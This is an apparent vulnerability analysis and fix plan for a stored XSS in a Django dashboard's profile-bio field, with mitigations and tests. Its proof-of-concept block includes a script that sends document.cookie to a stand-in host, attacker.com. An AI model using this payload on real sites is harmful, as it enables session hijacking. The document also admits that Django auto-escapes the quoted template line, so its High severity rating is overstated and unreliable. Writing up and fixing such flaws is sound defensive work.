# Stored XSS Vulnerability Analysis

## Vulnerability Summary

**Type:** Stored Cross-Site Scripting (XSS)  
**Location:** User profile bio rendering in `dashboard.html`  
**Severity:** High  
**CVSS Score:** 7.1 (High) - CWE-79

## Current Insecure Behavior

### Affected Component

- **File:** `kayigamba_david/templates/kayigamba_david/dashboard.html`
- **Line:** 156
- **Code:**
  ```django
  {% if user.profile.bio %}
  <tr>
    <td>Bio</td>
    <td>{{ user.profile.bio }}</td>
  </tr>
  {% endif %}
  ```

### Attack Vector

An attacker can inject malicious JavaScript into their bio field:

1. **Proof of Concept Attack:**

   ```html
   <img src="x" onerror="alert('XSS Vulnerability!')" />
   <script>
     document.location = "https://attacker.com/steal?cookie=" + document.cookie;
   </script>
   <iframe src="javascript:alert('Stored XSS')"></iframe>
   ```

2. **Exploitation Flow:**
   - User logs in and sets malicious bio in profile edit form
   - Django ORM stores the unfiltered text in the database
   - When any user views the dashboard, the bio is rendered unsafely
   - JavaScript executes in victim's browser with their session privileges
   - Attacker can steal session cookies, redirect users, perform actions as victims

### Why This Is a Problem

1. **Stored (Persistent):** Malicious payload doesn't require URL manipulation—it's in the database
2. **Affects All Users:** Every user viewing the dashboard is vulnerable
3. **Session Hijacking:** Attacker can steal authentication tokens
4. **Data Exfiltration:** Can access sensitive user information
5. **Privilege Escalation:** If admin views dashboard, admin account could be compromised

## Root Cause Analysis

### Django Auto-Escaping

Django's templates have auto-escaping **enabled by default**, which automatically converts:

- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#x27;`
- `&` → `&amp;`

However, the vulnerability exists because:

1. **Security Intent Not Explicit:** The code doesn't clearly show escaping intention
2. **Potential for Accidental Bypass:** If auto-escaping was ever disabled globally or locally
3. **Configuration Risk:** Template engine options not explicitly set to require escaping
4. **No Validation at Input:** Bio field accepts any text without sanitization

### Input Validation Gap

The `UserProfileForm` in `forms.py`:

```python
class UserProfileForm(forms.ModelForm):
    class Meta:
        model = UserProfile
        fields = ('bio',)
        widgets = {
            'bio': forms.Textarea(attrs={'rows': 4, 'placeholder': '...'}),
        }
```

**Issues:**

- No validators to prevent HTML or script content
- No max-length enforcement on the model (max_length=500 exists but not validated)
- No content filtering or sanitization
- Relies entirely on output encoding (defense-in-depth principle violated)

## Security Requirements

### Acceptance Criteria

✅ **Unsafe user-controlled content is not executed in the browser**

- Explicit escaping filter applied to bio rendering
- Test verifies script tags are escaped, not executed

✅ **Legitimate content still renders appropriately**

- Plain text, newlines, and special characters display correctly
- Unicode and emoji support maintained

✅ **Dangerous rendering shortcuts are removed or justified**

- No use of `|safe` filter with user content
- All user-controlled variables explicitly escaped

✅ **Tests demonstrate the issue is no longer exploitable**

- Unit tests verify escaping of malicious payloads
- Template rendering tests confirm no script execution

✅ **Existing repository behavior still works**

- Dashboard loads without errors
- Bio displays in profile edit form
- All profile update functionality preserved

## Mitigation Strategy

### Layer 1: Output Encoding (Primary Defense)

Apply explicit `|escape` filter in templates:

```django
{{ user.profile.bio|escape }}
```

### Layer 2: Input Validation (Defense-in-Depth)

Add validators to prevent dangerous patterns:

```python
from django.core.validators import RegexValidator

bio_validator = RegexValidator(
    regex=r'^[^<>]*$',
    message='Bio cannot contain HTML tags',
    code='invalid_bio'
)
```

### Layer 3: Content Security Policy (CSP Headers)

Configure response headers to prevent inline script execution:

```python
SECURE_CONTENT_SECURITY_POLICY = {
    'default-src': ("'self'",),
    'script-src': ("'self'",),
    'style-src': ("'self'", "'unsafe-inline'"),
}
```

### Layer 4: Defensive Code Review

- Use `|escape` explicitly for all user-controlled content
- Avoid `|safe` filter with untrusted data
- Prefer `|striptags` for plain-text-only fields
- Document why certain content is marked as safe

## Implementation Plan

### Step 1: Fix Template (dashboard.html)

Add `|escape` filter to bio rendering:

```django
<td>{{ user.profile.bio|escape }}</td>
```

### Step 2: Add Input Validation (forms.py & models.py)

- Add RegexValidator to prevent HTML in bio
- Document why validation is needed

### Step 3: Add Security Tests (tests.py)

- Test XSS payload escaping
- Test legitimate content rendering
- Test profile update with malicious input

### Step 4: Document in PR

- Explain the vulnerability
- Show attack scenario
- Demonstrate the fix
- Reference OWASP XSS Prevention

## References

- **OWASP XSS Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **CWE-79 Improper Neutralization of Input During Web Page Generation:** https://cwe.mitre.org/data/definitions/79.html
- **Django Template Security:** https://docs.djangoproject.com/en/stable/ref/templates/builtins/#escape
- **Django Auto-escaping:** https://docs.djangoproject.com/en/stable/topics/templates/#automatic-html-escaping
